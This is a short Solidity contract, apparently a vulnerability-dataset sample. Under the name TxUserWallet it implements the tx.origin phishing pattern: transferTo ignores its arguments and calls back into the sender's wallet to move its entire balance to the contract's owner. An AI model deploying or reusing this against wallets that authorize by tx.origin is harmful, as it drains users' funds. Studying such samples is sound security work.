pragma solidity 0.6.0;

contract TxUserWallet 
{
 address owner;
 constructor() public 
 {
   owner = tx.origin;
 }
 function transferTo(address payable dest, uint amount) public 
 {
   TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
 }
}